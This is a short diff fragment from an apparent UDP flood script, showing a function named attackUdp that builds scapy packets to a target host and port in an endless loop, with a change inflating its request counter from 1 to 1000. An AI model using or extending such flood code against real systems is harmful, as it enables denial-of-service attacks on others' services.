@@ -169,7 +169,7 @@ def attackUdp():
 	r    = bytes(IP(dst=host)/UDP(dport=int(port))/data)
 
 	while True:
-		req += 1
+		req += 1000
 		sock = socket.socket()
 
 		try:
